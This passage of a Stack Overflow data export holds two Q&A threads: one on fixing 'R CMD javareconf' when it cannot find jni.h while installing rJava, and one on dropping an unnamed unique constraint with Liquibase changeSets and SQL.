${JAVA_HOME=/usr/local/java/jdk-9.0.1}\n</code></pre>\n"},{"tags":[],"owner":{"account_id":14700756,"reputation":165,"user_id":10627775,"display_name":"chilifan"},"down_vote_count":0,"up_vote_count":3,"is_accepted":false,"score":3,"last_activity_date":1545113803,"creation_date":1545113803,"answer_id":53827360,"question_id":42562160,"body_markdown":"I already had Java 11 on ubuntu 18.04 but had to install jdk-11.0.1 following this guide: https://websiteforstudents.com/how-to-install-oracle-java-jdk-11-on-ubuntu-18-04-16-04-18-10/ \r\n\r\nI then changed JAVA_HOME in javaconf, just like @Spanska Forteva \r\n\r\n    sudo nano /usr/lib/R/etc/javaconfIn javaconf \r\n\r\nI found that the path to an old version of java was still specified.\r\n   \r\n    ## Versions from settings when configure was run\r\n    : ${JAVA_HOME=/usr/lib/jvm/default-java}\r\n    : ${JAVA_CPPFLAGS=~autodetect~}\r\n    : ${JAVA_LD_LIBRARY_PATH=~autodetect~}\r\n    : ${JAVA_LIBS=~autodetect~}\r\n\r\nI changed the path to JAVA_HOME to my newly installed jdk:\r\n\r\n    : ${JAVA_HOME=/usr/lib/jvm/jdk-11.0.1}\r\n\r\nThen ran the CMD with the path to jni.h specified:\r\n\r\n    sudo R CMD javareconf /usr/lib/jvm/jdk-11.0.1/include/jni.h\r\n\r\nThe last bit might not be needed, it should be able to look in that folder anyway, but that is what I did.\r\n\r\n\r\n","title":"R CMD javareconf not finding jni.h","body":"<p>I already had Java 11 on ubuntu 18.04 but had to install jdk-11.0.1 following this guide: <a href=\"https://websiteforstudents.com/how-to-install-oracle-java-jdk-11-on-ubuntu-18-04-16-04-18-10/\" rel=\"nofollow noreferrer\">https://websiteforstudents.com/how-to-install-oracle-java-jdk-11-on-ubuntu-18-04-16-04-18-10/</a> </p>\n\n<p>I then changed JAVA_HOME in javaconf, just like @Spanska Forteva </p>\n\n<pre><code>sudo nano /usr/lib/R/etc/javaconfIn javaconf \n</code></pre>\n\n<p>I found that the path to an old version of java was still specified.</p>\n\n<pre><code>## Versions from settings when configure was run\n: ${JAVA_HOME=/usr/lib/jvm/default-java}\n: ${JAVA_CPPFLAGS=~autodetect~}\n: ${JAVA_LD_LIBRARY_PATH=~autodetect~}\n: ${JAVA_LIBS=~autodetect~}\n</code></pre>\n\n<p>I changed the path to JAVA_HOME to my newly installed jdk:</p>\n\n<pre><code>: ${JAVA_HOME=/usr/lib/jvm/jdk-11.0.1}\n</code></pre>\n\n<p>Then ran the CMD with the path to jni.h specified:</p>\n\n<pre><code>sudo R CMD javareconf /usr/lib/jvm/jdk-11.0.1/include/jni.h\n</code></pre>\n\n<p>The last bit might not be needed, it should be able to look in that folder anyway, but that is what I did.</p>\n"},{"tags":[],"owner":{"account_id":12702640,"reputation":228,"user_id":9228901,"display_name":"Laurin Herbsthofer"},"down_vote_count":0,"up_vote_count":2,"is_accepted":false,"score":2,"last_activity_date":1551795822,"creation_date":1551795822,"answer_id":55005002,"question_id":42562160,"body_markdown":"Had the same problem and could finally fix it. After a lot of searching, this worked for me (I basically followed the guide here: https://www3.ntu.edu.sg/home/ehchua/programming/howto/JDK_Howto.html):\r\n\r\n - downloading and unpacking the JDK (jdk1.8.0_201) to /usr/java/\r\n - downloading and unpacking the JRE (jre1.8.0_201) to /usr/java/ (not sure if I needed this step but I did it in previous attempts to solve this problem)\r\n - Informing Ubuntu of the new java using appropriate versions\r\n\r\nFor this I ran:\r\n\r\n\r\n    $ sudo update-alternatives --install &quot;/usr/bin/java&quot; &quot;java&quot; &quot;/usr/java/jdk1.8.0_201/bin/java&quot; 1\r\n\r\n    $ sudo update-alternatives --install &quot;/usr/bin/javac&quot; &quot;javac&quot; &quot;/usr/java/jdk1.8.0_201/bin/javac&quot; 1\r\n\r\n    $ sudo update-alternatives --install &quot;/usr/bin/javaws&quot; &quot;javaws&quot; &quot;/usr/java/jdk1.8.0_201/bin/javaws&quot; 1\r\n\r\nfollowed by\r\n     \r\n    $ sudo update-alternatives --set java /usr/java/jdk1.8.0_201/bin/java\r\n\r\n    $ sudo update-alternatives --set javac /usr/java/jdk1.8.0_201/bin/javac\r\n\r\n    $ sudo update-alternatives --set javaws /usr/java/jdk1.8.0_201/bin/javaws\r\n\r\nThen I could finally see my java in the alternatives in\r\n\r\n    sudo update-alternatives --config java\r\n\r\nwhere I selected the newly installed java. Then I ran\r\n\r\n     sudo R CMD javareconf JAVA_HOME=/usr/java/jdk1.8.0_201/bin/\r\n\r\nin which I specified again my java jdk path explicitely. After this finished successfully I was able to install rJava in Rstudio which I needed to install glmulti.\r\n","title":"R CMD javareconf not finding jni.h","body":"<p>Had the same problem and could finally fix it. After a lot of searching, this worked for me (I basically followed the guide here: <a href=\"https://www3.ntu.edu.sg/home/ehchua/programming/howto/JDK_Howto.html\" rel=\"nofollow noreferrer\">https://www3.ntu.edu.sg/home/ehchua/programming/howto/JDK_Howto.html</a>):</p>\n\n<ul>\n<li>downloading and unpacking the JDK (jdk1.8.0_201) to /usr/java/</li>\n<li>downloading and unpacking the JRE (jre1.8.0_201) to /usr/java/ (not sure if I needed this step but I did it in previous attempts to solve this problem)</li>\n<li>Informing Ubuntu of the new java using appropriate versions</li>\n</ul>\n\n<p>For this I ran:</p>\n\n<pre><code>$ sudo update-alternatives --install \"/usr/bin/java\" \"java\" \"/usr/java/jdk1.8.0_201/bin/java\" 1\n\n$ sudo update-alternatives --install \"/usr/bin/javac\" \"javac\" \"/usr/java/jdk1.8.0_201/bin/javac\" 1\n\n$ sudo update-alternatives --install \"/usr/bin/javaws\" \"javaws\" \"/usr/java/jdk1.8.0_201/bin/javaws\" 1\n</code></pre>\n\n<p>followed by</p>\n\n<pre><code>$ sudo update-alternatives --set java /usr/java/jdk1.8.0_201/bin/java\n\n$ sudo update-alternatives --set javac /usr/java/jdk1.8.0_201/bin/javac\n\n$ sudo update-alternatives --set javaws /usr/java/jdk1.8.0_201/bin/javaws\n</code></pre>\n\n<p>Then I could finally see my java in the alternatives in</p>\n\n<pre><code>sudo update-alternatives --config java\n</code></pre>\n\n<p>where I selected the newly installed java. Then I ran</p>\n\n<pre><code> sudo R CMD javareconf JAVA_HOME=/usr/java/jdk1.8.0_201/bin/\n</code></pre>\n\n<p>in which I specified again my java jdk path explicitely. After this finished successfully I was able to install rJava in Rstudio which I needed to install glmulti.</p>\n"},{"tags":[],"owner":{"account_id":8466635,"reputation":29,"user_id":6355750,"display_name":"Alexander B. Leichtle"},"down_vote_count":1,"up_vote_count":3,"is_accepted":false,"score":2,"last_activity_date":1556627261,"creation_date":1556627261,"answer_id":55920975,"question_id":42562160,"body_markdown":"In my case, I had to run\r\n\r\n    R CMD javareconf\r\n\r\nas `su`, just `sudo` didn&#39;t work.","title":"R CMD javareconf not finding jni.h","body":"<p>In my case, I had to run</p>\n\n<pre><code>R CMD javareconf\n</code></pre>\n\n<p>as <code>su</code>, just <code>sudo</code> didn't work.</p>\n"},{"tags":[],"owner":{"account_id":12741083,"reputation":486,"user_id":11255970,"display_name":"Please don&#39;t laugh at me"},"down_vote_count":0,"up_vote_count":29,"is_accepted":false,"score":29,"last_activity_date":1564385644,"creation_date":1564385644,"answer_id":57249096,"question_id":42562160,"body_markdown":"&lt;!-- language-all: lang-bsh --&gt;\r\nI&#39;m not sure if an answer has been confirmed here, but I would point everyone to this [article][1] by Andrew Collier. \r\n\r\nWhat he recommends: \r\n\r\n**(1) Updating all repositories** \r\n    \r\n    sudo apt update -y\r\n\r\n**(2) Being sure JRE and JDK 8 are installed**\r\n\r\n    sudo apt install -y openjdk-8-jdk openjdk-8-jre\r\n\r\n**(3) Then, as many users have said already, pointing R to java with an explicit path to JDK 8**\r\n\r\n    sudo R CMD javareconf JAVA_HOME=/usr/lib/jvm/java-8-openjdk-amd64/\r\n\r\nThe specific Java package does not matter too much as long as it has all the necessary compiled contents within the /include directory.\r\n\r\n    user@laptop:~$ ls /usr/lib/jvm/java-8-openjdk-amd64/include/\r\n    classfile_constants.h  jdwpTransport.h  jvmticmlr.h  linux\r\n    jawt.h                 jni.h            jvmti.h\r\n\r\nFor more on this, I would recommend *[**how to make jni.h be found?**][2]* for going about locating/compiling this directory correctly.\r\n\r\n\r\n  [1]: https://datawookie.netlify.com/blog/2018/02/installing-rjava-on-ubuntu/\r\n  [2]: https://stackoverflow.com/questions/14529720/how-to-make-jni-h-be-found","title":"R CMD javareconf not finding jni.h","body":"<p>\nI'm not sure if an answer has been confirmed here, but I would point everyone to this <a href=\"https://datawookie.netlify.com/blog/2018/02/installing-rjava-on-ubuntu/\" rel=\"noreferrer\">article</a> by Andrew Collier. </p>\n\n<p>What he recommends: </p>\n\n<p><strong>(1) Updating all repositories</strong> </p>\n\n<pre class=\"lang-bsh prettyprint-override\"><code>sudo apt update -y\n</code></pre>\n\n<p><strong>(2) Being sure JRE and JDK 8 are installed</strong></p>\n\n<pre class=\"lang-bsh prettyprint-override\"><code>sudo apt install -y openjdk-8-jdk openjdk-8-jre\n</code></pre>\n\n<p><strong>(3) Then, as many users have said already, pointing R to java with an explicit path to JDK 8</strong></p>\n\n<pre class=\"lang-bsh prettyprint-override\"><code>sudo R CMD javareconf JAVA_HOME=/usr/lib/jvm/java-8-openjdk-amd64/\n</code></pre>\n\n<p>The specific Java package does not matter too much as long as it has all the necessary compiled contents within the /include directory.</p>\n\n<pre class=\"lang-bsh prettyprint-override\"><code>user@laptop:~$ ls /usr/lib/jvm/java-8-openjdk-amd64/include/\nclassfile_constants.h  jdwpTransport.h  jvmticmlr.h  linux\njawt.h                 jni.h            jvmti.h\n</code></pre>\n\n<p>For more on this, I would recommend <em><a href=\"https://stackoverflow.com/questions/14529720/how-to-make-jni-h-be-found\"><strong>how to make jni.h be found?</strong></a></em> for going about locating/compiling this directory correctly.</p>\n"},{"tags":[],"owner":{"account_id":8553969,"reputation":422,"user_id":6410117,"accept_rate":86,"display_name":"Yoann Pageaud"},"down_vote_count":0,"up_vote_count":1,"is_accepted":false,"score":1,"last_activity_date":1683718543,"creation_date":1683718543,"answer_id":76217920,"question_id":42562160,"body_markdown":"**For Ubuntu 22.04** user, `openjdk-19-jdk` &amp; `openjdk-19-jre` are available.\r\nInstalling these fix the issue as well.\r\nSo better use the latest available version:\r\n\r\n```\r\nsudo apt update -y\r\nsudo apt install -y openjdk-19-jdk openjdk-19-jre\r\nsudo R CMD javareconf JAVA_HOME=/usr/lib/jvm/java-19-openjdk-amd64/\r\n```","title":"R CMD javareconf not finding jni.h","body":"<p><strong>For Ubuntu 22.04</strong> user, <code>openjdk-19-jdk</code> &amp; <code>openjdk-19-jre</code> are available.\nInstalling these fix the issue as well.\nSo better use the latest available version:</p>\n<pre><code>sudo apt update -y\nsudo apt install -y openjdk-19-jdk openjdk-19-jre\nsudo R CMD javareconf JAVA_HOME=/usr/lib/jvm/java-19-openjdk-amd64/\n</code></pre>\n"}],"owner":{"account_id":16164,"reputation":20387,"user_id":34935,"accept_rate":60,"display_name":"dfrankow"},"comment_count":1,"delete_vote_count":0,"reopen_vote_count":0,"close_vote_count":0,"is_answered":true,"view_count":25046,"favorite_count":0,"down_vote_count":0,"up_vote_count":38,"answer_count":8,"score":38,"last_activity_date":1683718543,"creation_date":1488476086,"question_id":42562160,"body_markdown":"I&#39;m trying to install rJava in a docker container based on debian (jessie) with Anaconda.\r\n\r\nAs root, I did\r\n\r\n    $ apt-get update  &amp;&amp; apt-get install -y --no-install-recommends \\\r\n      default-jdk default-jre libicu-dev \r\n\r\nThen\r\n\r\n    $ R CMD javareconf \r\n    Java interpreter : /usr/lib/jvm/jdk1.8.0_121/jre/bin/java\r\n    Java version     : 1.8.0_121\r\n    Java home path   : /usr/lib/jvm/jdk1.8.0_121\r\n    Java compiler    : /usr/lib/jvm/jdk1.8.0_121/bin/javac\r\n    Java headers gen.: /usr/lib/jvm/jdk1.8.0_121/bin/javah\r\n    Java archive tool: /usr/lib/jvm/jdk1.8.0_121/bin/jar\r\n\r\n    trying to compile and link a JNI program \r\n    detected JNI cpp flags    : -I/usr/lib/jvm/java/include -I/usr/lib/jvm/java/include/linux\r\n    detected JNI linker flags : -L$(JAVA_HOME)/jre/lib/amd64/server -ljvm\r\n    gcc -std=gnu99 -I/opt/conda/lib/R/include -DNDEBUG -I/usr/lib/jvm/java/include -I/usr/lib/jvm/java/include/linux -I/opt/conda/include    -fpic  -I/opt/conda/include  -c conftest.c -o conftest.o\r\n    conftest.c:1:17: fatal error: jni.h: No such file or directory\r\n     #include &lt;jni.h&gt;\r\n                     ^\r\n    compilation terminated.\r\n    /opt/conda/lib/R/etc/Makeconf:133: recipe for target &#39;conftest.o&#39; failed\r\n    make: *** [conftest.o] Error 1\r\n    Unable to compile a JNI program\r\n\r\n\r\n    JAVA_HOME        : /usr/lib/jvm/jdk1.8.0_121\r\n    Java library path: \r\n    JNI cpp flags    : \r\n    JNI linker flags : \r\n    Updating Java configuration in /opt/conda/lib/R\r\n    Done.\r\n\r\nBut jni.h is right in the JDK:\r\n\r\n    # find /usr/lib/jvm/jdk1.8.0_121/ -name jni.h\r\n    /usr/lib/jvm/jdk1.8.0_121/include/jni.h\r\n\r\nIt just doesn&#39;t look like `javareconf` is finding it.  And, if I look at all the variables I could set with javareconf, like JAVA_HOME, I don&#39;t see the ability to set JNI cpp flags, which would need the right includes.\r\n\r\nI&#39;ve seen [various][1] [posts][2] around the Internet of this problem, but no solutions.\r\n\r\n\r\n  [1]: https://support.rstudio.com/hc/en-us/community/posts/202578567-Unable-to-install-rJava-package-on-OpenSUSE-13-2\r\n  [2]: https://github.com/caskroom/homebrew-cask/issues/7340","title":"R CMD javareconf not finding jni.h","body":"<p>I'm trying to install rJava in a docker container based on debian (jessie) with Anaconda.</p>\n\n<p>As root, I did</p>\n\n<pre><code>$ apt-get update  &amp;&amp; apt-get install -y --no-install-recommends \\\n  default-jdk default-jre libicu-dev \n</code></pre>\n\n<p>Then</p>\n\n<pre><code>$ R CMD javareconf \nJava interpreter : /usr/lib/jvm/jdk1.8.0_121/jre/bin/java\nJava version     : 1.8.0_121\nJava home path   : /usr/lib/jvm/jdk1.8.0_121\nJava compiler    : /usr/lib/jvm/jdk1.8.0_121/bin/javac\nJava headers gen.: /usr/lib/jvm/jdk1.8.0_121/bin/javah\nJava archive tool: /usr/lib/jvm/jdk1.8.0_121/bin/jar\n\ntrying to compile and link a JNI program \ndetected JNI cpp flags    : -I/usr/lib/jvm/java/include -I/usr/lib/jvm/java/include/linux\ndetected JNI linker flags : -L$(JAVA_HOME)/jre/lib/amd64/server -ljvm\ngcc -std=gnu99 -I/opt/conda/lib/R/include -DNDEBUG -I/usr/lib/jvm/java/include -I/usr/lib/jvm/java/include/linux -I/opt/conda/include    -fpic  -I/opt/conda/include  -c conftest.c -o conftest.o\nconftest.c:1:17: fatal error: jni.h: No such file or directory\n #include &lt;jni.h&gt;\n                 ^\ncompilation terminated.\n/opt/conda/lib/R/etc/Makeconf:133: recipe for target 'conftest.o' failed\nmake: *** [conftest.o] Error 1\nUnable to compile a JNI program\n\n\nJAVA_HOME        : /usr/lib/jvm/jdk1.8.0_121\nJava library path: \nJNI cpp flags    : \nJNI linker flags : \nUpdating Java configuration in /opt/conda/lib/R\nDone.\n</code></pre>\n\n<p>But jni.h is right in the JDK:</p>\n\n<pre><code># find /usr/lib/jvm/jdk1.8.0_121/ -name jni.h\n/usr/lib/jvm/jdk1.8.0_121/include/jni.h\n</code></pre>\n\n<p>It just doesn't look like <code>javareconf</code> is finding it.  And, if I look at all the variables I could set with javareconf, like JAVA_HOME, I don't see the ability to set JNI cpp flags, which would need the right includes.</p>\n\n<p>I've seen <a href=\"https://support.rstudio.com/hc/en-us/community/posts/202578567-Unable-to-install-rJava-package-on-OpenSUSE-13-2\" rel=\"noreferrer\">various</a> <a href=\"https://github.com/caskroom/homebrew-cask/issues/7340\" rel=\"noreferrer\">posts</a> around the Internet of this problem, but no solutions.</p>\n"},{"tags":["java","liquibase"],"comments":[{"owner":{"account_id":6014409,"reputation":15624,"user_id":4723795,"accept_rate":82,"display_name":"xenteros"},"score":0,"creation_date":1499773480,"post_id":24872539,"comment_id":77040689,"body_markdown":"http://www.liquibase.org/documentation/changes/drop_unique_constraint.html","body":"<a href=\"http://www.liquibase.org/documentation/changes/drop_unique_constraint.html\" rel=\"nofollow noreferrer\">liquibase.org/documentation/changes/drop_unique_constraint.h&zwnj;&#8203;tml</a>"}],"answers":[{"tags":[],"owner":{"account_id":3705312,"reputation":12754,"user_id":3084015,"accept_rate":86,"display_name":"Michael Parker"},"down_vote_count":2,"up_vote_count":1,"is_accepted":false,"score":-1,"last_activity_date":1405969463,"creation_date":1405969463,"answer_id":24872717,"question_id":24872539,"body_markdown":"I think your best bet is to query your information schema database to find what the name is, then use that to delete it with a ChangeLog\r\n\r\nThis worked for me:\r\n\r\n    SELECT `CONSTRAINT_NAME`\r\n    FROM  `TABLE_CONSTRAINTS` \r\n    WHERE  `CONSTRAINT_TYPE` LIKE  &#39;UNIQUE&#39;\r\n\r\nThis would, of course, return every Unique Constraint name in your db, but you should be able to narrow your search from there.","title":"Liquibase: How to drop unique constraint with no constraint name?","body":"<p>I think your best bet is to query your information schema database to find what the name is, then use that to delete it with a ChangeLog</p>\n\n<p>This worked for me:</p>\n\n<pre><code>SELECT `CONSTRAINT_NAME`\nFROM  `TABLE_CONSTRAINTS` \nWHERE  `CONSTRAINT_TYPE` LIKE  'UNIQUE'\n</code></pre>\n\n<p>This would, of course, return every Unique Constraint name in your db, but you should be able to narrow your search from there.</p>\n"},{"tags":[],"owner":{"account_id":7274201,"reputation":367,"user_id":5546186,"display_name":"Claus Radloff"},"down_vote_count":0,"up_vote_count":3,"is_accepted":false,"score":3,"last_activity_date":1447152142,"creation_date":1447152142,"answer_id":33628154,"question_id":24872539,"body_markdown":"You can execute a SQL like this, but it may not work on all databases:\r\n\r\n    &lt;sql&gt;alter table Person drop unique (name)&lt;/sql&gt;\r\n\r\nIf there is an explicit created index on that column, you may want to drop that too:\r\n\r\n    &lt;sql&gt;alter table Person drop unique (name) drop index&lt;/sql&gt;\r\n\r\nThis works for Oracle, other databases may have a different Syntax.","title":"Liquibase: How to drop unique constraint with no constraint name?","body":"<p>You can execute a SQL like this, but it may not work on all databases:</p>\n\n<pre><code>&lt;sql&gt;alter table Person drop unique (name)&lt;/sql&gt;\n</code></pre>\n\n<p>If there is an explicit created index on that column, you may want to drop that too:</p>\n\n<pre><code>&lt;sql&gt;alter table Person drop unique (name) drop index&lt;/sql&gt;\n</code></pre>\n\n<p>This works for Oracle, other databases may have a different Syntax.</p>\n"},{"tags":[],"owner":{"account_id":7977593,"reputation":59,"user_id":6020209,"display_name":"Dan Bradley"},"down_vote_count":1,"up_vote_count":6,"is_accepted":false,"score":5,"last_activity_date":1487860864,"creation_date":1487860864,"answer_id":42418831,"question_id":24872539,"body_markdown":"I ended up creating a new column to replace the column that has the unique constraint. \r\n\r\n    &lt;addColumn tableName=&quot;TABLE&quot; schemaName=&quot;SCHEMA&quot;&gt;\r\n    &lt;column name=&quot;NEW_COLUMN&quot; type=&quot;TYPE&quot; valueComputed=&quot;OLD_COLUMN&quot;&gt;&lt;/column&gt;\r\n    &lt;/addColumn&gt;\r\n    \r\n    &lt;dropColumn tableName=&quot;TABLE&quot; schemaName=&quot;SCHEMA&quot; columnName=&quot;OLD_COLUMN&quot;/&gt;\r\n    \r\n    &lt;renameColumn tableName=&quot;TABLE&quot; schemaName=&quot;SCHEMA&quot; oldColumnName=&quot;NEW_COLUMN&quot; newColumnName=&quot;OLD_COLUMN&quot;/&gt;\r\n\r\n","title":"Liquibase: How to drop unique constraint with no constraint name?","body":"<p>I ended up creating a new column to replace the column that has the unique constraint. </p>\n\n<pre><code>&lt;addColumn tableName=\"TABLE\" schemaName=\"SCHEMA\"&gt;\n&lt;column name=\"NEW_COLUMN\" type=\"TYPE\" valueComputed=\"OLD_COLUMN\"&gt;&lt;/column&gt;\n&lt;/addColumn&gt;\n\n&lt;dropColumn tableName=\"TABLE\" schemaName=\"SCHEMA\" columnName=\"OLD_COLUMN\"/&gt;\n\n&lt;renameColumn tableName=\"TABLE\" schemaName=\"SCHEMA\" oldColumnName=\"NEW_COLUMN\" newColumnName=\"OLD_COLUMN\"/&gt;\n</code></pre>\n"},{"tags":[],"owner":{"account_id":3248402,"reputation":2386,"user_id":2739334,"accept_rate":64,"display_name":"Pwnstar"},"down_vote_count":2,"up_vote_count":2,"is_accepted":false,"score":0,"last_activity_date":1499773287,"creation_date":1499773287,"answer_id":45033570,"question_id":24872539,"body_markdown":"The common way is:\r\n\r\n 1. Create a new column\r\n 2. Migrate the data to the new column (Update)\r\n 3. Delete the old column\r\n\r\n        &lt;changeSet id=&quot;20170711-001&quot; author=&quot;yourName&quot;&gt;\r\n    \t    &lt;addColumn tableName=&quot;tableName&quot;&gt;\r\n        \t\t&lt;column name=&quot;name2&quot; type=&quot;VARCHAR(255)&quot;&gt;\r\n        \t\t\t&lt;constraints nullable=&quot;false&quot; unique=&quot;false&quot; /&gt;\r\n        \t\t&lt;/column&gt;\r\n        \t&lt;/addColumn&gt;\r\n        &lt;/changeSet&gt;\r\n        &lt;changeSet author=&quot;yourName&quot; id=&quot;20170711-002&quot;&gt;\r\n            &lt;update tableName=&quot;tableName&quot;&gt;\r\n              &lt;column name=&quot;name2&quot; type=&quot;varchar(255)&quot; valueComputed=&quot;originalColumn&quot;/&gt;\r\n            &lt;/update&gt;\r\n        &lt;/changeSet&gt;\r\n        &lt;changeSet author=&quot;yourName&quot; id=&quot;20170711-003&quot;&gt;\r\n            &lt;dropColumn columnName=&quot;originalColumn&quot; tableName=&quot;tableName&quot;/&gt;\r\n        &lt;/changeSet&gt;\r\n\r\nIf you want to rename the new column like the old original column just repeat these steps by changing the names for the columns.","title":"Liquibase: How to drop unique constraint with no constraint name?","body":"<p>The common way is:</p>\n\n<ol>\n<li>Create a new column</li>\n<li>Migrate the data to the new column (Update)</li>\n<li><p>Delete the old column</p>\n\n<pre><code>&lt;changeSet id=\"20170711-001\" author=\"yourName\"&gt;\n    &lt;addColumn tableName=\"tableName\"&gt;\n        &lt;column name=\"name2\" type=\"VARCHAR(255)\"&gt;\n            &lt;constraints nullable=\"false\" unique=\"false\" /&gt;\n        &lt;/column&gt;\n    &lt;/addColumn&gt;\n&lt;/changeSet&gt;\n&lt;changeSet author=\"yourName\" id=\"20170711-002\"&gt;\n    &lt;update tableName=\"tableName\"&gt;\n      &lt;column name=\"name2\" type=\"varchar(255)\" valueComputed=\"originalColumn\"/&gt;\n    &lt;/update&gt;\n&lt;/changeSet&gt;\n&lt;changeSet author=\"yourName\" id=\"20170711-003\"&gt;\n    &lt;dropColumn columnName=\"originalColumn\" tableName=\"tableName\"/&gt;\n&lt;/changeSet&gt;\n</code></pre></li>\n</ol>\n\n<p>If you want to rename the new column like the old original column just repeat these steps by changing the names for the columns.</p>\n"},{"tags":[],"owner":{"account_id":11547984,"reputation":21,"user_id":8461459,"display_name":"whatever"},"down_vote_count":0,"up_vote_count":2,"is_accepted":false,"score":2,"last_activity_date":1502706594,"creation_date":1502704149,"answer_id":45671813,"question_id":24872539,"body_markdown":"If you using postgresql, you can find required constraintName in pgAdmin. Select you column, then go to fourth tab on the right (I believe it would be called &quot;dependencies&quot;, or something similar)\r\n\r\n[![enter image description here][1]][1]\r\n\r\nAs you can see, in my case constraintName is &quot;public.external_message_storage_message_external_uuid_key&quot; Then just do\r\n\r\n    \t&lt;changeSet author=&quot;me&quot;  id=&quot;dropping constraint&quot;&gt;\r\n\t\t\t&lt;dropUniqueConstraint constraintName=&quot;external_message_storage_message_external_uuid_key&quot;\r\n\t\t\t\t\t\t\t  schemaName=&quot;public&quot;\r\n\t\t\t\t\t\t\t  tableName=&quot;external_message_storage&quot;\r\n\t\t\t\t\t\t\t  uniqueColumns=&quot;message_external_uuid&quot;/&gt;\r\n\t\t&lt;/changeSet&gt;\r\n\r\n\r\n  [1]: https://i.stack.imgur.com/HHyQh.png","title":"Liquibase: How to drop unique constraint with no constraint name?","body":"<p>If you using postgresql, you can find required constraintName in pgAdmin. Select you column, then go to fourth tab on the right (I believe it would be called \"dependencies\", or something similar)</p>\n\n<p><a href=\"https://i.stack.imgur.com/HHyQh.png\" rel=\"nofollow noreferrer\"><img src=\"https://i.stack.imgur.com/HHyQh.png\" alt=\"enter image description here\"></a></p>\n\n<p>As you can see, in my case constraintName is \"public.external_message_storage_message_external_uuid_key\" Then just do</p>\n\n<pre><code>    &lt;changeSet author=\"me\"  id=\"dropping constraint\"&gt;\n        &lt;dropUniqueConstraint constraintName=\"external_message_storage_message_external_uuid_key\"\n                          schemaName=\"public\"\n                          tableName=\"external_message_storage\"\n                          uniqueColumns=\"message_external_uuid\"/&gt;\n    &lt;/changeSet&gt;\n</code></pre>\n"},{"tags":[],"owner":{"account_id":4421966,"reputation":170,"user_id":3601615,"accept_rate":62,"display_name":"Ales"},"down_vote_count":0,"up_vote_count":1,"is_accepted":false,"score":1,"last_activity_date":1540299346,"creation_date":1540299346,"answer_id":52949660,"question_id":24872539,"body_markdown":"This is an old question, but nonetheless. For me works when I use column name as a constraint name:\r\n(MySQL)\r\n\r\n    &lt;changeSet id=&quot;remove_unique_column_constraint&quot; author=&quot;author&quot;&gt;\r\n            &lt;dropUniqueConstraint schemaName=&quot;xxx&quot;\r\n                                  tableName=&quot;xxx&quot;\r\n                                  constraintName=&quot;column_name&quot;/&gt;\r\n            &lt;rollback&gt;\r\n                   &lt;addUniqueConstraint schemaName=&quot;xxx&quot;\r\n                                 tableName=&quot;xxx&quot;\r\n                                 columnNames=&quot;some_id&quot;\r\n                                 constraintName=&quot;constraint_name&quot;/&gt;\r\n             &lt;/rollback&gt;\r\n    &lt;/changeSet&gt;\r\n\r\nIn rollback you can set previous constraint name or new. But if in rollback you will set new constraintName, you should make rollback and set this name in dropUniqueConstraint command.","title":"Liquibase: How to drop unique constraint with no constraint name?","body":"<p>This is an old question, but nonetheless. For me works when I use column name as a constraint name:\n(MySQL)</p>\n\n<pre><code>&lt;changeSet id=\"remove_unique_column_constraint\" author=\"author\"&gt;\n        &lt;dropUniqueConstraint schemaName=\"xxx\"\n                              tableName=\"xxx\"\n                              constraintName=\"column_name\"/&gt;\n        &lt;rollback&gt;\n               &lt;addUniqueConstraint schemaName=\"xxx\"\n                             tableName=\"xxx\"\n                             columnNames=\"some_id\"\n                             constraintName=\"constraint_name\"/&gt;\n         &lt;/rollback&gt;\n&lt;/changeSet&gt;\n</code></pre>\n\n<p>In rollback you can set previous constraint name or new. But if in rollback you will set new constraintName, you should make rollback and set this name in dropUniqueConstraint command.</p>\n"},{"tags":[],"owner":{"account_id":8091203,"reputation":2621,"user_id":6097074,"accept_rate":83,"display_name":"ankit"},"down_vote_count":0,"up_vote_count":0,"is_accepted":false,"score":0,"last_activity_date":1543053390,"creation_date":1543053390,"answer_id":53457030,"question_id":24872539,"body_markdown":"In liquibase, there is problem with `dropUniqueConstraint` with some DB like `postgres 9.6.6 aurora` so for drop unique constraint use following:\r\n\r\n    - changeSet:\r\n        id: dropunique_constraints\r\n        author: ankitaggarwal\r\n        changes:\r\n        - dropForeignKeyConstraint:\r\n            baseTableName: member_account\r\n            constraintName: composite_unique_member_account\r\n\r\nor\r\n\r\n    - changeSet:\r\n        id: dropunique_constraints\r\n        author: ankitaggarwal\r\n        changes:\r\n        - sql:\r\n           sql: &quot;ALTER TABLE member_account DROP CONSTRAINT composite_unique_member_account&quot;","title":"Liquibase: How to drop unique constraint with no constraint name?","body":"<p>In liquibase, there is problem with <code>dropUniqueConstraint</code> with some DB like <code>postgres 9.6.6 aurora</code> so for drop unique constraint use following:</p>\n\n<pre><code>- changeSet:\n    id: dropunique_constraints\n    author: ankitaggarwal\n    changes:\n    - dropForeignKeyConstraint:\n        baseTableName: member_account\n        constraintName: composite_unique_member_account\n</code></pre>\n\n<p>or</p>\n\n<pre><code>- changeSet:\n    id: dropunique_constraints\n    author: ankitaggarwal\n    changes:\n    - sql:\n       sql: \"ALTER TABLE member_account DROP CONSTRAINT composite_unique_member_account\"\n</code></pre>\n"},{"tags":[],"owner":{"account_id":13261077,"reputation":2382,"user_id":9575631,"display_name":"Ousama"},"down_vote_count":0,"up_vote_count":2,"is_accepted":false,"score":2,"last_activity_date":1628669636,"creation_date":1620840987,"answer_id":67508517,"question_id":24872539,"body_markdown":"I solved this problem using the following code : \r\n\r\n    &lt;changeSet id=&quot;202112050129-1&quot; author=&quot;ousama&quot;&gt;\r\n    \t&lt;sql&gt;\r\n    \t\tDeclare @Cons_Name NVARCHAR(100)\r\n    \t\tDeclare @Str NVARCHAR(500)\r\n    \t\tSELECT @Cons_Name=name FROM sys.objects WHERE type=&#39;UQ&#39; AND OBJECT_NAME(parent_object_id) = N&#39;tableName&#39;\r\n    \t\tSET @Str=&#39;ALTER TABLE tableName DROP CONSTRAINT &#39; + @Cons_Name\r\n    \t\tExec (@Str)\r\n    \t&lt;/sql&gt;\r\n    &lt;/changeSet&gt;\r\n\r\n***Hope this will help you***","title":"Liquibase: How to drop unique constraint with no constraint name?","body":"<p>I solved this problem using the following code :</p>\n<pre><code>&lt;changeSet id=&quot;202112050129-1&quot; author=&quot;ousama&quot;&gt;\n    &lt;sql&gt;\n        Declare @Cons_Name NVARCHAR(100)\n        Declare @Str NVARCHAR(500)\n        SELECT @Cons_Name=name FROM sys.objects WHERE type='UQ' AND OBJECT_NAME(parent_object_id) = N'tableName'\n        SET @Str='ALTER TABLE tableName DROP CONSTRAINT ' + @Cons_Name\n        Exec (@Str)\n    &lt;/sql&gt;\n&lt;/changeSet&gt;\n</code></pre>\n<p><em><strong>Hope this will help 